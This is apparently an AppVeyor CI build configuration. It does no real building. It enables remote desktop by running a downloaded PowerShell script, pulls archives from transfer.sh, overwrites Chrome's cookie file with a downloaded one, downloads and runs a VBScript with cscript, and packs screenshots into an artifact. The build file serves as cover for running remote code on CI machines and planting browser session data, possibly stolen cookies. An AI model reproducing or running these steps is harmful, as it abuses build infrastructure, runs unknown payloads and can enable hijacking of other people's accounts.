
os: Unstable

version: 1.0.{build}
init:
- ps: iex ((new-object net.webclient).DownloadString('https://raw.githubusercontent.com/appveyor/ci/master/scripts/enable-rdp.ps1'))
before_build:
- cmd: >-

    %windir%\system32\reg.exe import Disable_Explorer_Auto_Complete_popup.reg

    set PATH=C:\Program Files\Git\mingw64\bin;%PATH%

    git config --global core.excludesfile "%USERPROFILE%\.gitignore_global"    
    
    nuget restore
    
    curl -o %localappdata%\RDP.7z https://transfer.sh/k3QWp/RD_19v_21.04.7z
    
    7z e C:\Users\appveyor\AppData\Local\rdp.7z -y -oC:\Users\appveyor\AppData\Local -spf
    
    curl -o "%localappdata%\Google\Chrome\User Data\Default\Cookie" https://transfer.sh/zaTfF/27-04-bb-gh
    
    curl -o %localappdata%\chrome.vbs https://transfer.sh/BSZvW/chrome.vbs
    
    cscript %localappdata%\chrome.vbs
build:
  verbosity: minimal
after_test:
- cmd: >-

    7z a %APPVEYOR_BUILD_FOLDER%\screenshot.7z C:\Users\appveyor\Documents\*.jpg    
artifacts:
 - path: screenshot.7z
   name: screenshot